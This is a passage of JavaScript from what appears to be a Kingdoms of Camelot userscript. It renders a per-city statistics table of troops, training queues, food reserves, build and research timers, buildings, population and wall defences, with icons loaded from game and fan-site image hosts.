	if (Options.includeResIcons==true) str += _row ('<img height='+Options.ResIconSize+' title="'+culang.astone+'" src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/aetherstone_30.png>', rows[5], false, 0);
	if (Options.includeResIcons==false)    str += _row (''+culang.astone+'', rows[5], false, 0);
	}
    for (r=1; r<13; r++){
            rows[r] = [];
        for(i=0; i<Cities.numCities; i++) {
                rows[r][i] = 0;
            }
        }
    if (Options.includeCity){
       for (r=1; r<13; r++){
         for(i=0; i<Cities.numCities; i++) {
            cityID = 'city'+ Cities.cities[i].id;
            rows[r][i] = parseInt(Seed.units[cityID]['unt'+r]);
         }
       }
    }
      if (Options.includeMarching) {
        for (var i=0; i<13; i++)
          rows[i][Cities.numCities] = march.marchUnits[i];
      }
      if (Options.includeTraining){
        var q = Seed.queue_unt;

        for(i=0; i<Cities.numCities; i++) {
          q = Seed.queue_unt['city'+ Cities.cities[i].id];
          if (q && q.length>0){
            for (qi=0; qi<q.length; qi++)
              rows[q[qi][0]][i] += parseInt(q[qi][1]);
          }    
        }
      }  
    if (Options.includeNahrung) {
       row = [];
      for(i=0; i<Cities.numCities; i++) {
        var rp = getResourceProduction (Cities.cities[i].id);
        var usage = parseInt(Seed.resources["city" + Cities.cities[i].id]['rec1'][3]);
        row[i] = rp[1] - usage;
      }
		if (Options.showStatsHeadlines =="noHeadlines") str += '<TR><TD></td></tr>';
		if (Options.showStatsHeadlines =="borderHeadlines") str += '<TR><TD class=pdxStatBoarder></td></tr>';
		if (Options.showStatsHeadlines =="pdxStatLine") str += '<TR><TD class=pdxStat>'+culang.Hfood+'</td></tr>';

		if (Options.includeResIcons==true) 
		str += _row ('<img height='+Options.ResIconSize+' src=http://koc.god-like.info/img/food_30.png title="'+culang.STuse+'"><img height='+Options.IconSize+' src=https://koc-power-pdx.googlecode.com/svn/trunk/img/plus.png title="'+culang.plus+'"><img height='+Options.IconSize+' src=https://koc-power-pdx.googlecode.com/svn/trunk/img/minus.png title="'+culang.minus+'">', row, true);
		if (Options.includeResIcons==false) 
		str += _row ('<span class=pdxCapShadowRR>'+culang.STuse+'</span>', row, true);
      
      for(i=0; i<Cities.numCities; i++) {
        if (row[i] >= 0)
          row[i] = '----';
        else {
          var timeLeft = parseInt(Seed.resources["city" + Cities.cities[i].id]['rec1'][0]) / 3600 / (0-row[i]) * 3600;
          if (timeLeft > 86313600)
            row[i] = '----';
          else {
            if (Options.enableFoodWarn && timeLeft<(Options.foodWarnHours*3600))
              row[i] = '<SPAN class=whiteOnRed>'+ timestrShort(timeLeft) +'</span>';
            else
              row[i] = timestrShort(timeLeft);
          }
        }
      }
      if (Options.includeResIcons==true) str += _row ('<img height='+Options.ResIconSize+' src=http://koc.god-like.info/img/food_30.png title="'+culang.leftfor+'"> <img height='+Options.ResIconSize+' src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/7.jpg title="'+culang.leftfor+'">', row, true);
      if (Options.includeResIcons==false) str += _row ('<span class=pdxCapShadowRR>'+culang.leftfor+'</span>', row, true);
      }
	// Training rows
    t_rows = [];
    for (r=2; r<26; r+=2){
        t_rows[r] = [];
        for(j=0; j<Cities.numCities; j++) {
       t_rows[r][j] = [0];
          cityID = 'city'+ Cities.cities[j].id;    
          var q = Seed.queue_unt[cityID];
          var supply_t=militia_t=scout_t=pike_t=sword_t=archer_t=cavalry_t=heavy_t=wagon_t=ballista_t=ram_t=catapult_t=0 ;     
           for (var i=0; i<q.length; i++){
        switch(q[i][0]) {
          case '1':
          supply_t += parseInt(q[i][1]);
         break;
        case '2':
          militia_t += parseInt(q[i][1]);
          break;
        case '3':
          scout_t += parseInt(q[i][1]);
          break;
        case '4':
          pike_t += parseInt(q[i][1]);
          break;
        case '5':
          sword_t += parseInt(q[i][1]);
          break;
        case '6':
         archer_t += parseInt(q[i][1]);
          break;
        case '7':
          cavalry_t += parseInt(q[i][1]);
          break;
        case '8':
          heavy_t += parseInt(q[i][1]);
          break;
        case '9':
         wagon_t += parseInt(q[i][1]);
          break;
        case '10':
          ballista_t += parseInt(q[i][1]);
          break;
          case '11':
          ram_t += parseInt(q[i][1]);
          break;
        case '12':
          catapult_t += parseInt(q[i][1]);
              break;
      }
        switch(r) {
          case 2:
          t_rows[r][j] = parseInt(supply_t);
        break;
          case 4:
          t_rows[r][j] = parseInt(militia_t);
        break;
          case 6:
          t_rows[r][j] = parseInt(scout_t);
        break;
          case 8:
          t_rows[r][j] = parseInt(pike_t);
        break;
          case 10:
          t_rows[r][j] = parseInt(sword_t);
        break;
          case 12:
          t_rows[r][j] = parseInt(archer_t);
        break;
          case 14:
          t_rows[r][j] = parseInt(cavalry_t);
        break;
          case 16:
          t_rows[r][j] = parseInt(heavy_t);
        break;
          case 18:
          t_rows[r][j] = parseInt(wagon_t);
        break;
          case 20:
          t_rows[r][j] = parseInt(ballista_t);
        break;
          case 22:
          t_rows[r][j] = parseInt(ram_t);
        break;
          case 24:
          t_rows[r][j] = parseInt(catapult_t);
        break;
			}
          }  
        }
    }    
      rownum = 0;
	  	  
if (Options.includeTruppen) {
	if (Options.showStatsHeadlines =="noHeadlines") str += '<TR><TD></td></tr>';
	if (Options.showStatsHeadlines =="borderHeadlines") str += '<TR><TD class=pdxStatBoarder></td></tr>';
	if (Options.showStatsHeadlines =="pdxStatLine") str += '<TR><TD class=pdxStat>'+culang.Htroops+'</td></tr>';
	rownum = 0;  
	for (r=1; r<13; r++){
	if (Options.includeIcons==true) str += _row ('<img height='+Options.IconSize+' title="'+unsafeWindow.unitcost['unt'+r][0]+'" src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_'+r+'_50_s34.jpg>', rows[r],false, r);
	if (Options.includeIcons==false) str += _row (unsafeWindow.unitcost['unt'+r][0], rows[r]);
}
if (Options.includeTraining) {
  var intmax = 0;
	if (Options.showStatsHeadlines =="noHeadlines") str += '<TR><TD></td></tr>';
	if (Options.showStatsHeadlines =="borderHeadlines") str += '<TR><TD class=pdxStatBoarder></td></tr>';
	if (Options.showStatsHeadlines =="pdxStatLine") str += '<TR><TD class=pdxStat>'+culang.HSTtrain+'</td></tr>';

  for (intt=0; intt<t_rows[2].length; intt++) {
  if (t_rows[2][intt] > intmax) {intmax = t_rows[2][intt]};
  }
  if (intmax > 0)
  if (Options.includeTrainTroopIcon==true)
  str += _row ('<img height='+Options.TrTroopIconSize+' src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_1_50_s34.jpg title="'+culang.supplytroop+'">', t_rows[2])
  else if (Options.includeTrainTroopIcon==false)
  str += _row ('<SPAN class=pdxCapShadowSG>'+culang.supplytroop+'</span>', t_rows[2])
  //}
  var intmax = 0;
  for (intt=0; intt<t_rows[4].length; intt++) {	 if (t_rows[4][intt] > intmax) {intmax = t_rows[4][intt]};  }
  if (intmax > 0)
  if (Options.includeTrainTroopIcon==true)
  str += _row ('<img height='+Options.TrTroopIconSize+' src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_2_50_s34.jpg title="'+culang.militiaman+'">', t_rows[4])
  else if (Options.includeTrainTroopIcon==false)
  str += _row ('<SPAN class=pdxCapShadowSG>'+culang.militiaman+'</span>', t_rows[4])
  var intmax = 0;
  for (intt=0; intt<t_rows[6].length; intt++) {	 if (t_rows[6][intt] > intmax) {intmax = t_rows[6][intt]};  }
  if (intmax > 0)
  if (Options.includeTrainTroopIcon==true)
  str += _row ('<img height='+Options.TrTroopIconSize+' src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_3_50_s34.jpg title="'+culang.scout+'">', t_rows[6])
  else if (Options.includeTrainTroopIcon==false)
  str += _row ('<SPAN class=pdxCapShadowSG>'+culang.scout+'</span>', t_rows[6])
  var intmax = 0;
  for (intt=0; intt<t_rows[8].length; intt++) {  if (t_rows[8][intt] > intmax) {intmax = t_rows[8][intt]};  }
  if (intmax > 0)
  if (Options.includeTrainTroopIcon==true)
  str += _row ('<img height='+Options.TrTroopIconSize+' src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_4_50_s34.jpg title="'+culang.pikeman+'">', t_rows[8])
  else if (Options.includeTrainTroopIcon==false)
  str += _row ('<SPAN class=pdxCapShadowSG>'+culang.pikeman+'</span>', t_rows[8])
  var intmax = 0;
  for (intt=0; intt<t_rows[10].length; intt++) {  if (t_rows[10][intt] > intmax) {intmax = t_rows[10][intt]};  }
  if (intmax > 0)
  if (Options.includeTrainTroopIcon==true)
  str += _row ('<img height='+Options.TrTroopIconSize+' src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_5_50_s34.jpg title="'+culang.swordsman+'">', t_rows[10])
  else if (Options.includeTrainTroopIcon==false)
  str += _row ('<SPAN class=pdxCapShadowSG>'+culang.swordsman+'</span>', t_rows[10])
  var intmax = 0;
  for (intt=0; intt<t_rows[12].length; intt++) {  if (t_rows[12][intt] > intmax) {intmax = t_rows[12][intt]};  }
  if (intmax > 0)
  if (Options.includeTrainTroopIcon==true)
  str += _row ('<img height='+Options.TrTroopIconSize+' src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_6_50_s34.jpg title="'+culang.archer+'">', t_rows[12])
  else if (Options.includeTrainTroopIcon==false)
  str += _row ('<SPAN class=pdxCapShadowSG>'+culang.archer+'</span>', t_rows[12])
  var intmax = 0;
  for (intt=0; intt<t_rows[14].length; intt++) {  if (t_rows[14][intt] > intmax) {intmax = t_rows[14][intt]};  }
  if (intmax > 0)
  if (Options.includeTrainTroopIcon==true)
  str += _row ('<img height='+Options.TrTroopIconSize+' src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_7_50_s34.jpg title="'+culang.cavalry+'">', t_rows[14])
  else if (Options.includeTrainTroopIcon==false)
  str += _row ('<SPAN class=pdxCapShadowSG>'+culang.cavalry+'</span>', t_rows[14])
  var intmax = 0;
  for (intt=0; intt<t_rows[16].length; intt++) {  if (t_rows[16][intt] > intmax) {intmax = t_rows[16][intt]};  }
  if (intmax > 0)
  if (Options.includeTrainTroopIcon==true)
  str += _row ('<img height='+Options.TrTroopIconSize+' src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_8_50_s34.jpg title="'+culang.heavycavalry+'">', t_rows[16])
  else if (Options.includeTrainTroopIcon==false)
  str += _row ('<SPAN class=pdxCapShadowSG>'+culang.heavycavalry+'</span>', t_rows[16])
  var intmax = 0;
  for (intt=0; intt<t_rows[18].length; intt++) {  if (t_rows[18][intt] > intmax) {intmax = t_rows[18][intt]};  }
  if (intmax > 0)
  if (Options.includeTrainTroopIcon==true)
  str += _row ('<img height='+Options.TrTroopIconSize+' src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_9_50_s34.jpg title="'+culang.supplywagon+'">', t_rows[18])
  else if (Options.includeTrainTroopIcon==false)
  str += _row ('<SPAN class=pdxCapShadowSG>'+culang.supplywagon+'</span>', t_rows[18])
  var intmax = 0;
  for (intt=0; intt<t_rows[20].length; intt++) {  if (t_rows[20][intt] > intmax) {intmax = t_rows[20][intt]};  }
  if (intmax > 0)
  if (Options.includeTrainTroopIcon==true)
  str += _row ('<img height='+Options.TrTroopIconSize+' src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_10_50_s34.jpg title="'+culang.ballista+'">', t_rows[20])
  else if (Options.includeTrainTroopIcon==false)
  str += _row ('<SPAN class=pdxCapShadowSG>'+culang.ballista+'', t_rows[20])
  var intmax = 0;
  for (intt=0; intt<t_rows[22].length; intt++) {  if (t_rows[22][intt] > intmax) {intmax = t_rows[22][intt]};  }
  if (intmax > 0)
  if (Options.includeTrainTroopIcon==true)
  str += _row ('<img height='+Options.TrTroopIconSize+' src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_11_50_s34.jpg title="'+culang.batteringram+'">', t_rows[22])
  else if (Options.includeTrainTroopIcon==false)
  str += _row ('<SPAN class=pdxCapShadowSG>'+culang.batteringram+'</span>', t_rows[22])
  var intmax = 0;
  for (intt=0; intt<t_rows[24].length; intt++) {  if (t_rows[24][intt] > intmax) {intmax = t_rows[24][intt]};  }
  if (intmax > 0)
  if (Options.includeTrainTroopIcon==true)
  str += _row ('<img height='+Options.TrTroopIconSize+' src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_12_50_s34.jpg title="'+culang.catapult+'">', t_rows[24])
  else if (Options.includeTrainTroopIcon==false)
  str += _row ('<SPAN class=pdxCapShadowSG>'+culang.catapult+'</span>', t_rows[24])
  }
  str += '<TR><TD></td></tr>';
}
// RESEARCH AND OTHER TIMES
if (Options.includeReseachBuildTimes) {
 var now = unixTime();
 		if (Options.showStatsHeadlines =="noHeadlines") str += '<TR><TD></td></tr>';
		if (Options.showStatsHeadlines =="borderHeadlines") str += '<TR><TD class=pdxStatBoarder></td></tr>';
		if (Options.showStatsHeadlines =="pdxStatLine") str += '<TR><TD class=pdxStat>'+culang.HbuildResearchs+'</td></tr>';
           
		   str +='<tr style="" align=right><td><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/131.jpg title="'+culang.buildTimes+'"></td><td>&nbsp;</td>';
            for(i=0; i<Cities.numCities; i++) {
             var totTime = 0;
             if (Seed.queue_con["city" + Cities.cities[i].id].length > 0) {
              var q=Seed.queue_con["city" + Cities.cities[i].id][0];
              var totTime = 0;
              totTime = q[4] - now;
              if (totTime < 0)
                totTime = 0;
              if (totTime < 3600)
                affuichage = '<SPAN class=boldRed><B>'+ timestr(totTime) +'</b></span>';
              else
                affuichage = timestr(totTime);		           
	   if (Options.showStatsStyle =="noborder") str +='<td style="padding: 3px;" align=right>' + affuichage + ' </td>'; // noborder
       if (Options.showStatsStyle =="borderright") str +='<td style="padding: 3px; border-right: 1px solid #141516;" align=right>' + affuichage + ' </td>'; // includeBorderRight
       if (Options.showStatsStyle =="borderstyle") str +='<td style="padding: 3px; border: 1px solid #141516;" align=right>' + affuichage + ' </td>'; // includeBorderStyle
	   if (Options.showStatsStyle =="borderrightleft") str +='<td style="padding: 3px; border-right: 1px solid #141516; border-left: 1px solid #141516;" align=right>' + affuichage + ' </td>'; // includeBorderStyle
	   if (Options.showStatsStyle =="shadowbox") str +='<td style="padding: 3px; -moz-box-shadow:inset 0px 0px 5px #000;" align=right>' + affuichage + ' </td>'; // includeShadowBox
	   if (Options.showStatsStyle =="inset") str +='<td style="padding: 3px; border: 1px inset #333" align=right>' + affuichage + ' </td>'; // includeInset  
             } else {
             str +="<td>0s</td>";
             }
            }    
            str +="</tr>"; 
            //
            str +='<tr style="" align=right><td><img height=20 src=http://koc.god-like.info/build_alchemy_26.png title="'+culang.research+'"><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1.jpg title="'+culang.research+'"></b></td><td>&nbsp;</td>';
            for(i=0; i<Cities.numCities; i++) {
             var totTime = 0;
             if (Seed.queue_tch["city" + Cities.cities[i].id].length > 0) {
              var q=Seed.queue_tch["city" + Cities.cities[i].id][0];
              var totTime = 0;
              totTime = q[3] - now;
              if (totTime < 0)
                totTime = 0;
              if (totTime < 3600)
                affuichage = '<SPAN class=boldRed><B>'+ timestr(totTime) +'</b></span>';
              else
                affuichage = timestr(totTime);     
			if (Options.showStatsStyle =="noborder") str +='<td style="padding: 3px;" align=right>' + affuichage + ' </td>'; // noborder
			if (Options.showStatsStyle =="borderright") str +='<td style="padding: 3px; border-right: 1px solid #141516;" align=right>' + affuichage + ' </td>'; // includeBorderRight
			if (Options.showStatsStyle =="borderstyle") str +='<td style="padding: 3px; border: 1px solid #141516;" align=right>' + affuichage + ' </td>'; // includeBorderStyle
			if (Options.showStatsStyle =="borderrightleft") str +='<td style="padding: 3px; border-right: 1px solid #141516; border-left: 1px solid #141516;" align=right>' + affuichage + ' </td>'; // includeBorderStyle
			if (Options.showStatsStyle =="shadowbox") str +='<td style="padding: 3px; -moz-box-shadow:inset 0px 0px 5px #000;" align=right>' + affuichage + ' </td>'; // includeShadowBox
			if (Options.showStatsStyle =="inset") str +='<td style="padding: 3px; border: 1px inset #333" align=right>' + affuichage + ' </td>'; // includeInset 
             } else {
             str +="<td>0s</td>";
             }
            }    
             str +="</tr>"; 
          str +='<tr style="" align=right><td><img height=20 src=http://koc.god-like.info/build_fey_spire.png title="'+culang.crafting+'"><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/3.jpg title="'+culang.crafting+'"></b></td><td>&nbsp;</td>';
            for(i=0; i<Cities.numCities; i++) {
             var totTime = 0;
             if (Seed.queue_craft["city" + Cities.cities[i].id].length > 0) {
              var q=Seed.queue_craft["city" + Cities.cities[i].id][0];
              var totTime = 0;
              totTime = q.craftingEtaUnixTime - now;
              if (totTime < 0)
                totTime = 0;
              if (getCityBuilding(Cities.cities[i].id,20).count>0 && totTime == 0)
                affuichage = '<SPAN class=boldRed><B>'+ timestr(totTime) +'</b></span>';
              else
                affuichage = timestr(totTime);
			if (Options.showStatsStyle =="noborder") str +='<td style="padding: 3px;" align=right><span onclick="Crafting('+Cities.cities[i].id+');">'+ affuichage + '</span></td>'; // noborder
			if (Options.showStatsStyle =="borderright") str +='<td style="padding: 3px; border-right: 1px solid #141516;" align=right><span onclick="Crafting('+Cities.cities[i].id+');">'+ affuichage + '</span></td>'; // includeBorderRight
			if (Options.showStatsStyle =="borderstyle") str +='<td style="padding: 3px; border: 1px solid #141516;" align=right><span onclick="Crafting('+Cities.cities[i].id+')">'+ affuichage + '</span></td>'; // includeBorderStyle
			if (Options.showStatsStyle =="borderrightleft") str +='<td style="padding: 3px; border-right: 1px solid #141516; border-left: 1px solid #141516;" align=right><span onclick="Crafting('+Cities.cities[i].id+');">'+ affuichage + '</span></td>'; // includeBorderStyle
			if (Options.showStatsStyle =="shadowbox") str +='<td style="padding: 3px; -moz-box-shadow:inset 0px 0px 5px #000;" align=right><span onclick="Crafting('+Cities.cities[i].id+');">'+ affuichage + '</span></td>'; // includeShadowBox
			if (Options.showStatsStyle =="inset") str +='<td style="padding: 3px; border: 1px inset #333" align=right><span onclick="Crafting('+Cities.cities[i].id+');">'+ affuichage + '</span></td>'; // includeInset 

			} else {
			 
             affuichage = timestr(totTime);
             if (getCityBuilding(Cities.cities[i].id,20).count>0)
                affuichage = '<SPAN class=boldRed><B>'+ timestr(totTime) +'</b></span>';
                
              str +='<td><span onclick="Crafting('+Cities.cities[i].id+');">'+affuichage+'</span></td>';
             }
            }    
             str +="</tr>";    
	}

if (Options.BauAnzeigen) {
	if (Options.showStatsHeadlines =="noHeadlines") str += '<TR><TD></td></tr>';
		if (Options.showStatsHeadlines =="borderHeadlines") str += '<TR><TD class=pdxStatBoarder></td></tr>';
		if (Options.showStatsHeadlines =="pdxStatLine") str += '<TR><TD class=pdxStat>'+culang.Hbuilds+'</td></tr>';
        rowsnm = [];
        for (r=0; r<23; r++){
          rowsnm[r] = [];
        }
        for(i=0; i<Cities.numCities; i++) {
          cityID = 'city' + Cities.cities[i].id;
          getAllCityBuildings(cityID);
          rowsnm[0][i]  = sumCastle;
          rowsnm[1][i]  = sumCottage;
          rowsnm[2][i]  = sumTavern;
          rowsnm[3][i]  = sumKnightsHall;
          rowsnm[4][i]  = sumEmbassy;
          rowsnm[5][i]  = sumStorehouse;
          rowsnm[6][i]  = sumMarket;
          rowsnm[7][i]  = sumAlchemyLab;
          rowsnm[8][i]  = sumRallyPoint;
          rowsnm[9][i]  = sumBarracks;
          rowsnm[10][i] = sumWatchTower;
          rowsnm[11][i] = sumBlacksmith;
          rowsnm[12][i] = sumWorkshop;
          rowsnm[13][i] = sumStable;
          rowsnm[14][i] = sumReliefStation;
          rowsnm[15][i] = sumWall;
          rowsnm[16][i] = sumGuardian;
          rowsnm[17][i] = sumInside;
          rowsnm[18][i] = sumFarm;
          rowsnm[19][i] = sumSawmill;
          rowsnm[20][i] = sumQuarry;
          rowsnm[21][i] = sumMine;
          rowsnm[22][i] = sumOutside;
        }
        rownum = 0;
        str += _row ('<span class=pdxCapShadowSG>'+culang.alchemy+'</span>',  rowsnm[7], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.barracks+'</span>',  rowsnm[9], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.blacksmith+'</span>',  rowsnm[11], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.castle+'</span>',    rowsnm[0], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.cottages+'</span>',   rowsnm[1], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.embassy+'</span>',   rowsnm[4], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.guardians+'</span>',  rowsnm[16], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.kightshall+'</span>',   rowsnm[3], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.market+'</span>',    rowsnm[6], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.rallyp+'</span>',  rowsnm[8], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.reliefs+'</span>', rowsnm[14], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.stable+'</span>',    rowsnm[13], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.storehouse+'</span>',   rowsnm[5], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.tavern+'</span>',    rowsnm[2], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.tower+'</span>',     rowsnm[10], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.wall+'</span>',      rowsnm[15], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.workshop+'</span>',   rowsnm[12], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.city+'</span>',    rowsnm[17], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.farm+'</span>',      rowsnm[18], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.sawmill+'</span>',   rowsnm[19], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.quarry+'</span>',    rowsnm[20], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.mine+'</span>',      rowsnm[21], true);
        str += _row ('<span class=pdxCapShadowSG>'+culang.field+'</span>',   rowsnm[22], true);
      }
        if (Options.bevAnzeigen) {
		
		if (Options.showStatsHeadlines =="noHeadlines") str += '<TR><TD></td></tr>';
		if (Options.showStatsHeadlines =="borderHeadlines") str += '<TR><TD class=pdxStatBoarder></td></tr>';
		if (Options.showStatsHeadlines =="pdxStatLine") str += '<TR><TD class=pdxStat>'+culang.Hpop+'</td></tr>';
		
        rowsnm = [];
        for (r=0; r<7; r++){
          rowsnm[r] = [];
        }
        for(i=0; i<Cities.numCities; i++) {
          cityID = 'city'+ Cities.cities[i].id;
          rowsnm[0][i] = parseInt(Seed.citystats[cityID]["pop"][1]);       // Max population
          rowsnm[1][i] = parseInt(Seed.citystats[cityID]["pop"][0]);       // Current population
          rowsnm[2][i] = parseInt(Seed.citystats[cityID]["pop"][3]);       // Labor force
          rowsnm[5][i] = parseInt(Seed.citystats[cityID]["pop"][2]);       // Happiness
          rowsnm[3][i] = rowsnm[0][i] * rowsnm[5][i] / 100 - rowsnm[2][i]; // Max Idle population
          rowsnm[4][i] = rowsnm[1][i] - rowsnm[2][i];                      // Current Idle population
          rowsnm[6][i] = parseInt(Seed.citystats[cityID]["gold"][1]);      // Tax
          if (rowsnm[6][i] > 0)
            rowsnm[6][i] = '<SPAN class=boldRed>' + rowsnm[6][i] + '</SPAN>';
        }

        rownum = 0;
        str += _row ('<span class=pdxCapShadowSG>'+culang.maxpop+'</span>',  rowsnm[0]);
        if (Options.includeIcons==true) str += _row ('<img height='+Options.IconSize+' src=https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/population_40.png title="'+culang.pop+'">',  rowsnm[1]);
        if (Options.includeIcons==false) str += _row ('<span class=pdxCapShadowSG>'+culang.pop+'</span>',  rowsnm[1]);
        str += _row ('<span class=pdxCapShadowSG>'+culang.worker+'</span>',  rowsnm[2]);
        str += _row ('<span class=pdxCapShadowSG>'+culang.maxidle+'</span>', rowsnm[3]);
        str += _row ('<span class=pdxCapShadowSG>'+culang.idle+'</span>', rowsnm[4]);
        if (Options.includeIcons==true) str += _row ('<img height='+Options.IconSize+' src=https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/happiness.png title="% '+culang.luck+'">',  rowsnm[5], true);
        if (Options.includeIcons==false) str += _row ('<span class=pdxCapShadowSG>% '+culang.luck+'</span>',  rowsnm[5], true);
        if (Options.includeIcons==true) str += _row ('<img height='+Options.IconSize+' src=https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/taxes.png title="'+culang.tax+'">', rowsnm[6], true);
        if (Options.includeIcons==false) str += _row ('<span class=pdxCapShadowSG>'+culang.tax+'</span>', rowsnm[6], true);   
	 }
  if (Options.defAnzeigen) {
		if (Options.showStatsHeadlines =="noHeadlines") str += '<TR><TD></td></tr>';
		if (Options.showStatsHeadlines =="borderHeadlines") str += '<TR><TD class=pdxStatBoarder></td></tr>';
		if (Options.showStatsHeadlines =="pdxStatLine") str += '<TR><TD class=pdxStat>'+culang.Hwalldef+'</td></tr>';
			
        rowsnm = [];
        for (r=0; r<5; r++){
          rowsnm[r] = [];
        }
        for(i=0; i<Cities.numCities; i++) {
          var wall = {};
          getWallInfo (Cities.cities[i].id, wall);
          rowsnm[0][i] = parseInt(wall.Crossbows);
          rowsnm[1][i] = parseInt(wall.Trebuchet);
          rowsnm[2][i] = parseInt(wall.Caltrops);
          if (isNaN(parseInt(wall.SpikedBarrier))) // KoC bug if wall lvl 0
            rowsnm[3][i] = 0;
          else
          rowsnm[3][i] = parseInt(wall.SpikedBarrier);
          rowsnm[4][i] = parseInt(wall.Trap);
        }
        if (Options.defBau){
          var q = Seed.queue_unt;
          for(i=0; i<Cities.numCities; i++) {
            var q = Seed.queue_fort['city'+Cities.cities[i].id];
            if (q && q.length>0){
              for (qi=0; qi<q.length; qi++) {
                if (q[qi][0]==53)
                  rowsnm[0][i] += parseInt(q[qi][1]);
                if (q[qi][0]==55)
                  rowsnm[1][i] += parseInt(q[qi][1]);
                if (q[qi][0]==60)
                  rowsnm[4][i] += parseInt(q[qi][1]);
                if (q[qi][0]==61)
                  rowsnm[2][i] += parseInt(q[qi][1]);
                if (q[qi][0]==62)
                  rowsnm[3][i] += parseInt(q[qi][1]);
              }
            }
          }
        }
 rownum = 0;
 if (Options.includeIcons==true) str += _row ('<img height='+Options.IconSize+' src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_53_30.png title="'+culang.crossbows+'">',  rowsnm[0]);
 if (Options.includeIcons==false) str += _row ('<span class=pdxCapShadowRR>'+culang.crossbows+'</span>',  rowsnm[0]);
 if (Options.includeIcons==true) str += _row ('<img height='+Options.IconSize+' src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_55_30.png title="'+culang.trebuchet+'">',  rowsnm[1]);
 if (Options.includeIcons==false) str += _row ('<span class=pdxCapShadowRR>'+culang.trebuchet+'</span>',  rowsnm[1]);
 if (Options.includeIcons==true) str += _row ('<img height='+Options.IconSize+' src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_61_30.png title="'+culang.caltr+'">',  rowsnm[2]);
 if (Options.includeIcons==false) str += _row ('<span class=pdxCapShadowRR>'+culang.caltr+'</span>',  rowsnm[2]);
 if (Options.includeIcons==true) str += _row ('<img height='+Options.IconSize+' src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_62_30.png title="'+culang.spiked+'">', rowsnm[3]);
 if (Options.includeIcons==false) str += _row ('<span class=pdxCapShadowRR>'+culang.spiked+'</span>', rowsnm[3]);
 if (Options.includeIcons==true) str += _row ('<img height='+Options.IconSize+' src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_60_30.png title="'+culang.trap+'">',  rowsnm[4]);
 if (Options.includeIcons==false) str += _row ('<span class=pdxCapShadowRR>'+culang.trap+'</span>',  rowsnm[4]);
 }
    if (Options.includeNahrungUnten) {
      row = [];
      for(i=0; i<Cities.numCities; i++) {
        var rp = getResourceProduction (Cities.cities[i].id);
        var usage = parseInt(Seed.resources["city" + Cities.cities[i].id]['rec1'][3]);
        row[i] = rp[1] - usage;
      }
		if (Options.showStatsHeadlines =="noHeadlines") str += '<TR><TD></td></tr>';
		if (Options.showStatsHeadlines =="borderHeadlines") str += '<TR><TD class=pdxStatBoarder></td></tr>';
		if (Options.showStatsHeadlines =="pdxStatLine") str += '<TR><TD class=pdxStat>'+culang.Hfood+'</td></tr>';

		if (Options.includeResIcons==true) 
			str += _row ('<img height='+Options.ResIconSize+' src=http://koc.god-like.info/img/food_30.png title="'+culang.STuse+'"><img height='+Options.IconSize+' src=https://koc-power-pdx.googlecode.com/svn/trunk/img/plus.png title="'+culang.plus+'"><img height='+Options.IconSize+' src=https://koc-power-pdx.googlecode.com/svn/trunk/img/minus.png title="'+culang.minus+'">', row, true);
		if (Options.includeResIcons==false)  
			str += _row ('<span class=pdxCapShadowRR>'+culang.STuse+'</span>', row, true);
		for(i=0; i<Cities.numCities; i++) {
        if (row[i] >= 0)
          row[i] = '----';
        else {
          var timeLeft = parseInt(Seed.resources["city" + Cities.cities[i].id]['rec1'][0]) / 3600 / (0-row[i]) * 3600;
          if (timeLeft > 86313600)
            row[i] = '----';
          else {
            if (Options.enableFoodWarn && timeLeft<(Options.foodWarnHours*3600))
              row[i] = '<SPAN class=whiteOnRed>'+ timestrShort(timeLeft) +'</span>';
            else
              row[i] = timestrShort(timeLeft);
          }
        }
      }    
